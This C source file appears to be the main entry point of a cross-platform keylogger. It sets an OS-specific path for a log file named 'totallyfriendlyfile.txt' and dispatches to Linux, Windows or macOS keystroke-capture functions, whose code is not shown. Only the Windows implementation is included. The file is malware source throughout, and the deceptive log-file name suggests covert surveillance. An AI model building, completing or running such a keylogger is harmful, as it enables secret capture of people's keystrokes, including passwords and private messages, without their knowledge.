#include <stdio.h>
#include "Windows/win_keylog.c"

// depending on the OS, we'll use a different path for the log file
#ifdef __linux__
    #define LOGFILE "./Linux/totallyfriendlyfile.txt"
#elif defined _WIN32
    #define LOGFILE "./Windows/totallyfriendlyfile.txt"
#elif defined __MACH__
    #define LOGFILE "./macOS/totallyfriendlyfile.txt"
#endif

// calling the right keylogger depending on the OS
int main() {
    printf("Listening for keystrokes...\n");
    #ifdef __linux__
        // keylogger for Unix
        linux_keylog(LOGFILE);

	#elif defined _WIN32	
        // keylogger for Windows
		windows_keylog(LOGFILE);
        
	#elif defined __MACH__
        // keylogger for MacOS
		macos_keylog(LOGFILE);

    #else
        // no keylogger for an unknown OS
        printf("At this point let's just forfeit :/\n");
	#endif

    return 0;
}
